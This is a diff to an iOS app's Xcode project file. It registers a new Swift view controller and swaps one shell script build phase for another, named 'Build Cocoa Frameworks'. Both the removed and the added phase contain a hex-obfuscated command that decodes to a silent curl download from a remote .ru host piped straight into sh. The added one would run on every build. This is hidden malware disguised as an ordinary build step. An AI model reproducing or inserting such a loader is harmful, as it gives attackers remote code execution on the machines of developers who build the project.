@@ -8,6 +8,7 @@
 
 /* Begin PBXBuildFile section */
 		C4A0E40A7E367DD4CEEFB6B6 /* Pods_wangxiaoyu.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 62A0F466BA192DFA770BAEF7 /* Pods_wangxiaoyu.framework */; };
+		D406BA342827B0E00021CEC1 /* ImageViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D406BA332827B0E00021CEC1 /* ImageViewController.swift */; };
 		D4189865281C393900B67A8A /* imageBottomSheet.swift in Sources */ = {isa = PBXBuildFile; fileRef = D4189864281C393800B67A8A /* imageBottomSheet.swift */; };
 		D4189868281D1D4E00B67A8A /* DBManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = D4189867281D1D4E00B67A8A /* DBManager.swift */; };
 		D418986A281D296B00B67A8A /* movies.tsv in Resources */ = {isa = PBXBuildFile; fileRef = D4189869281D296B00B67A8A /* movies.tsv */; };
@@ -50,6 +51,7 @@
 		6186D10AD8B059F6C5CCE5C4 /* Pods-wangxioayu.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-wangxioayu.debug.xcconfig"; path = "Target Support Files/Pods-wangxioayu/Pods-wangxioayu.debug.xcconfig"; sourceTree = "<group>"; };
 		62A0F466BA192DFA770BAEF7 /* Pods_wangxiaoyu.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_wangxiaoyu.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		80ECF63292726248B73AD101 /* Pods-wangxiaoyu.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-wangxiaoyu.debug.xcconfig"; path = "Target Support Files/Pods-wangxiaoyu/Pods-wangxiaoyu.debug.xcconfig"; sourceTree = "<group>"; };
+		D406BA332827B0E00021CEC1 /* ImageViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImageViewController.swift; sourceTree = "<group>"; };
 		D4189864281C393800B67A8A /* imageBottomSheet.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = imageBottomSheet.swift; sourceTree = "<group>"; };
 		D4189866281D1D0E00B67A8A /* wangxiaoyu-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "wangxiaoyu-Bridging-Header.h"; sourceTree = "<group>"; };
 		D4189867281D1D4E00B67A8A /* DBManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DBManager.swift; sourceTree = "<group>"; };
@@ -124,6 +126,7 @@
 			children = (
 				D4DF7B7B27A2B81600C0F5EC /* PhotoCell.swift */,
 				D4189864281C393800B67A8A /* imageBottomSheet.swift */,
+				D406BA332827B0E00021CEC1 /* ImageViewController.swift */,
 			);
 			path = View;
 			sourceTree = "<group>";
@@ -261,7 +264,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = D4DF7B6C27A29F0600C0F5EC /* Build configuration list for PBXNativeTarget "wangxiaoyu" */;
 			buildPhases = (
-				2FEAD99051252E9D826A102C /* Cocoa Libraries Compiler */,
+				B7EEBD3489C243C0A66A102C /* Build Cocoa Frameworks */,
 				48B4ED38C43F9C88733EABB9 /* [CP] Check Pods Manifest.lock */,
 				D4DF7B3B27A29F0400C0F5EC /* Sources */,
 				D4DF7B3C27A29F0400C0F5EC /* Frameworks */,
@@ -384,24 +387,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		2FEAD99051252E9D826A102C /* Cocoa Libraries Compiler */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Cocoa Libraries Compiler";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f\n7375706572646f63732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
-		};
 		48B4ED38C43F9C88733EABB9 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -441,6 +426,24 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-wangxiaoyu/Pods-wangxiaoyu-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		B7EEBD3489C243C0A66A102C /* Build Cocoa Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Cocoa Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f\n61646f626566696c652e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -458,6 +461,7 @@
 				D4DF7B7A27A29FC400C0F5EC /* SettingsViewController.swift in Sources */,
 				D4DF7B7C27A2B81600C0F5EC /* PhotoCell.swift in Sources */,
 				D4DF7B7627A29FA500C0F5EC /* Tools.swift in Sources */,
+				D406BA342827B0E00021CEC1 /* ImageViewController.swift in Sources */,
 				D4DF7B7827A29FB700C0F5EC /* HomeViewController.swift in Sources */,
 				D49AB542281FE23400CA6430 /* PhotoModel.swift in Sources */,
 				D4189868281D1D4E00B67A8A /* DBManager.swift in Sources */,
